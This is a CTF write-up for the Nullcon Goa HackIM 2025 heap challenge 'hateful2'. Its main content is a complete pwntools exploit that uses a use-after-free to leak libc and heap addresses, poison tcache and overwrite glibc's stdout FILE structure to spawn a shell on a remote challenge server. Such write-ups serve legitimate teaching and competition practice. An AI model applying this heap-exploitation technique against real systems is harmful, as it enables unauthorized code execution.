---
title: "hateful2 - Nullcon Goa HackIM 2025 CTF"
category: "pwn"
subcategory: "heap"
type: "writeup"
tags: ["pwn", "heap", "use-after-free", "hateful2", "nullcon-goa-hackim-2025-ctf", "2025", "ctf-writeup"]
summary: "In this challenge we are provided with a binary of a regular heap challenge(create,edit,delete,view)"
source:
  name: "CTFtime writeup #39961"
  url: "https://ctftime.org/writeup/39961"
ctf:
  name: "Nullcon Goa HackIM 2025 CTF"
  year: 2025
  challenge: "hateful2"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2025 CTF
- **Task:** hateful2
- **Author team:** InfoSecIITR
- **CTFtime:** <https://ctftime.org/writeup/39961>

---
### EXPLOIT OF HATEFUL2 ###  
In this challenge we are provided with a binary of a regular heap challenge(create,edit,delete,view)

main bug --> Use after free (We can edit the chunk after being freed) 

A small issue --> Libc version is preety new so no `malloc or free hooks`.

So i used `STDOUT_FILE_STRUCT` Overwrite to get the shell.

Here is the full exploit script.

```from pwn import *  
elf = context.binary = ELF('./hateful2_patched')  
libc = ELF('./libc.so.6')  
global r  
# r = process()  
r = remote('52.59.124.14','5022')  
# gdb.attach(r)  
def defuscate(x,l=64):  
p = 0  
for i in range(l*4,0,-4): # 16 nibble  
v1 = (x & (0xf << i )) >> i  
v2 = (p & (0xf << i+12 )) >> i+12  
p |= (v1 ^ v2) << i  
return p

def obfuscate(p, adr):  
return p^(adr>>12)

def create(index,size,data):  
r.sendlineafter(b'>> ',b'1')  
r.sendlineafter(b'Index: ',str(index).encode())  
r.sendlineafter(b'Size: ',str(size).encode())  
r.sendlineafter(b'>> ',data)

def edit(index,data):  
r.sendlineafter(b'>> ',b'2')  
r.sendlineafter(b'Index: ',str(index).encode())   
r.sendlineafter(b'>> ',data)

def delete(index):  
r.sendlineafter(b'>> ',b'4')  
r.sendlineafter(b'Index: ',str(index).encode())

def view(index):  
r.sendlineafter(b'>> ',b'3')  
r.sendlineafter(b'Index: ',str(index).encode())

create(0,0x410,b'aaaa')  
create(1,24,b'bbbb')  
delete(0)  
view(0)  
r.recvuntil(b'Message: ')  
libc.address = unpack(r.recv(6),'all') + 0x720c2d138000 -0x720c2d30acc0  
print(hex(libc.address))  
create(2,0x410,b'eeee')  
create(3,0x1e0,b'ffff')  
create(4,0x1e0,b'gggg')  
create(5,24,b'hhhh')  
create(6,24,b'kkkk')  
create(7,24,b'kkkk')  
delete(5)  
delete(6)  
view(6)  
r.recvuntil(b'Message: ')  
heap_leak = defuscate(unpack(r.recv(6),'all')) + 0x620dfcb64000 - 0x620dfcb64ac0

print(hex(heap_leak))  
delete(3)  
delete(4)  
edit(4,pack(obfuscate(libc.sym['_IO_2_1_stdout_'],heap_leak)))  
create(6,0x1e0,b'iiii')

stdout_lock = libc.sym['_IO_2_1_stdout_'] + 0x250 # _IO_stdfile_1_lock (symbol not exported)  
stdout = libc.sym['_IO_2_1_stdout_']  
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18  
gadget = libc.address + 0x000000000014059c # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)  
fake.flags = 0x3b01010101010101  
fake._IO_read_end=libc.sym.system  
fake._IO_save_base = gadget  
fake._IO_write_end=u64(b'/bin/sh\x00') # will be at rdi+0x10  
fake._lock=stdout_lock  
fake._codecvt= stdout + 0xb8  
fake._wide_data = stdout_lock+0x18  
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)  
payload = bytes(fake)

create(8,0x1e0,payload)

r.interactive()```
